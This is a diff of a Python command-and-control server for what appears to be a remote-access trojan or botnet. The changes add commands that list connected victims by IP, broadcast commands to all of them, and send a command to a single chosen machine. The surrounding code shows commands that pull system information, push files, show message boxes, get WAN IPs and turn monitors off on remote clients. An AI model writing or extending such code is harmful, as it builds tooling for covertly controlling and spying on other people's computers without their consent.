@@ -5,7 +5,7 @@ import configparser
 import requests
 from urllib.request import urlopen
 from .fetchinfo import *
-
+import colorama
 
 
 VERSION = "V.0"
@@ -42,11 +42,21 @@ def Server():
 
         def SendData(data):
             data = data.encode()
+            
             try:
-                sock.send(data)
+                for sockfd in clist:
+                    sockfd.sendall(data)
             except Exception as serror:
                 print("[ERROR] " + str(serror))
         
+        def private(client, data):
+            data = data.encode()
+            
+            try:
+                client.send(data)
+            except Exception as serror:
+                print("[ERROR] " + str(serror))
+                
         def SendBytes(data): # Send without encoding..
             try:
                 sock.send(data)
@@ -57,7 +67,7 @@ def Server():
             try:
                 data = input("-> ")
                 msg = data.encode()
-                # args = data.split()
+                args = data.split()
 
                 if(data == "info"):
                     try:
@@ -69,7 +79,18 @@ def Server():
                         print("[^] Getting System information..")
                         GetINFO(client, infofilename)
                         print("[+] Got System information.")
-                
+                elif(data == "list"):
+                    print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "Online : " + colorama.Style.RESET_ALL + str(len(clist)))
+                    for i in range(len(iplist)):
+                        print("["+str(i)+"]: " + colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX + iplist[i] + colorama.Style.RESET_ALL)
+                elif(data.startswith("send")):
+                    try:
+                        send_socket = int(args[1])
+                        private(clist[send_socket], args[2])
+                    except IndexError:
+                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : send <id> <command>" + colorama.Style.RESET_ALL + str(len(clist)))
+
+
                 elif(data == "sendfile"):
                     try:
                         filename = input("[?] Filename -> ")
@@ -121,11 +142,7 @@ def Server():
                     msg = input("[>] Enter Message Box Message -> ")
                     title = input("[>] Enter Message Box Title -> ")
                     SendData("msgbox="+msg+"="+title)
-
-                elif(data == "me"):
-                    print("[+] Hostname : " + socket.gethostname())
-                    print("[+] Status : Online.")
-                    print("[+] Bot(s) : Online.")
+                    
 
                 elif(data == "wanip"):
                     SendData("wanip\n")
@@ -148,6 +165,8 @@ def Server():
                     - monitoron - Turn monitor ON.
                     - monitoroff - Turn monitor Off.
                     - playaudio - Play Audio.
+                    
+                    Use send <id> <data> to send a command to a single client.
                     """)
                 elif(data == "cdopen"):
                     SendData("cdopen")
@@ -166,8 +185,8 @@ def Server():
                     client.close()
                     server.close()
                     exit(True)
-                else:
-                    print("[~] Unknown command.")
+                # else:
+                #     print("[~] Unknown command.")
             except KeyboardInterrupt:
                 print(" Keyboard Interrupt. Exit.")
                 exit(True)
